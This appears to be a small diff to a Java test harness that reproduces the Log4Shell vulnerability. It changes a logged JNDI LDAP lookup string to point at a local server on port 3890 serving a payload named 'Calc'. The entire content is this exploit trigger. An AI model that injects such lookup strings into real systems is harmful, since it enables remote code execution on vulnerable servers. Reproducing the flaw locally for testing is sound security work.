@@ -6,7 +6,7 @@ public class log4j {
 
     public static void main(String[] args) throws InterruptedException {
         if (args.length == 0) {
-            logger.error("${jndi:ldap://127.0.0.1/exp}");
+            logger.error("${jndi:ldap://127.0.0.1:3890/Calc}");
             return;
         }
         System.out.println(args[0]);
